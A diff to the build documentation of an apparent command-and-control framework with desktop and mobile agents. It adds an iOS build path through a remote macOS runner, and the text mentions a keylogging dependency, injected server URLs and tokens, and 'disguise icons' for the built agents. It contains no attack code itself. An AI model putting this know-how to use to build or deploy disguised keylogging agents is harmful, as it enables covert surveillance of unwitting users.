@@ -20,7 +20,7 @@ Build, run and develop the C2 server + agents.
 | .NET SDK  | `Microsoft.DotNet.SDK.8` / `dotnet-sdk` | `dotnet-sdk-8.0` | `dotnet` | `dotnet` |
 | Java      | Oracle.JDK / `openjdk`     | `openjdk-17-jdk`  | `openjdk`      | `javac`          |
 | Android   | Android Studio / SDK cmdline-tools (any OS) | same | same | `gradle` + `ANDROID_HOME`/`ANDROID_SDK_ROOT` |
-| iOS       | —                             | —                | `xcode-select --install` | `xcrun` + iphoneos SDK |
+| iOS       | — (or `tools/ios-builder-setup.ps1`)  | — (or `tools/ios-builder-setup.sh`)  | `xcode-select --install` | `builder` (ios-builder) or `xcrun` + iphoneos SDK |
 
 **Rust on Linux/WSL** additionally needs X11/input dev headers because the
 `rdev` dependency (keylog) compiles `evdev-sys`:
@@ -33,7 +33,10 @@ sudo apt-get install autoconf automake libtool libevdev-dev \
 
 **Android template** (`clients/mobile/android/`) is a minimal Gradle project
 (package `com.wym.c2`, no external deps, `assembleRelease`). iOS
-(`clients/mobile/ios/`) compiles with a bare `xcrun swiftc` (no `.xcodeproj`).
+(`clients/mobile/ios/`) builds with the **MobAI ios-builder** CLI on any host —
+it snapshots the working tree, compiles on a GitHub macOS runner and downloads
+the IPA to `./dist/`; without the CLI, a macOS server falls back to a bare
+`xcrun swiftc` (the XcodeGen manifest `project.yml` is not used by that path).
 Server URL/token/interval are injected into `Config.java`/`Config.swift`; the
 artifact name + disguise icon are rendered by `server/icons.py`. Both are
 folded into the cache hash, so a cached build is never stale.
